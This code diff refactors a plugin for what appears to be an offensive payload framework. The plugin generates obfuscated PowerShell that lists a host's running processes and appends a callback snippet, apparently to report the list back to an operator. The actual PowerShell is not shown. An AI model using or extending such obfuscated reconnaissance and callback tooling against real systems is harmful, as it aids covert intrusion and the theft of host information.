@@ -1,12 +1,14 @@
 from plugins._base import BaseCradlePlugin
+from core.models import CradleInstance
 from core.obfuscate_getrandom import get_random_obfuscated_string as sgr
 
 class EnumProcessesPsSgr(BaseCradlePlugin):
-    NAME        = "enum-processes-ps-sgr"
+    NAME        = "enum_processes_ps_sgr"
     DESCRIPTION = "Enumeration - Gets running processes using SGR (Seeded Get-Random) obfuscated PowerShell"
     AUTHOR      = "CyberSecN00b"
 
     OPTIONS = {
+        **BaseCradlePlugin.OPTIONS,
         "ENUM_METHOD": {
             "description": "Enumeration Method: Get-CimInstance, Get-WmiObject, Get-Process (may not have command lines)",
             "default": "Get-CimInstance",
@@ -14,8 +16,8 @@ class EnumProcessesPsSgr(BaseCradlePlugin):
         }
     }
 
-    def generate(self, options: dict) -> str:
-        method  = options.get("ENUM_METHOD", "Get-CimInstance").lower()
+    def generate(self, inst: CradleInstance) -> str:
+        method  = inst.options.get("ENUM_METHOD", "Get-CimInstance").lower()
         payload = []
 
         if method == "get-ciminstance":
@@ -32,7 +34,7 @@ class EnumProcessesPsSgr(BaseCradlePlugin):
             )
 
         payload.append(
-            self.notification_callback_snippet({"proc_list","$proc_list"})
+            self.notification_callback_snippet(inst,{"proc_list":"$proc_list"})
         )
 
-        "\n".join(payload) + "\n"
+        return "\n".join(payload) + "\n"
